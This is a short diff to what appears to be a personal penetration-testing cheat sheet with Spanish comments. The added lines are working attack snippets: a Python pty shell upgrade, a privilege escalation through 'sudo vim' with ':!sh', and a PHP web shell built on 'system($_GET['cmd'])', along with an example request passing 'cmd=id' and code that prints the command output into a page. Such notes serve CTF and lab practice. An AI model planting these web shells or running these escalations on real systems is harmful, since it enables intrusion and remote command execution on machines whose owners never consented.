@@ -1,7 +1,11 @@
 printf "\x02\x61\x72\x63\x68\x69\x76\x65\x5f\x69\x6e\x74\x61\x6b\x65"
 
-```
+```zsh
+# este comando se ralla con vim
 python3 -c 'import pty; pty.spawn("/bin/bash")'
+#privesc
+sudo vim
+:!sh or :!bash
 ```
 unified - terminal
 ```
@@ -31,6 +35,10 @@ php
 ```
 <?php echo system($_GET['cmd']); ?>
 system($_GET['cmd']);
+
+/?p=6&cmd=id
+$resultado = system($_GET['cmd']);
+<h1 class="page-title"><?= $resultado ?></h1>
 ```
 yaml - exploit
 ```bash
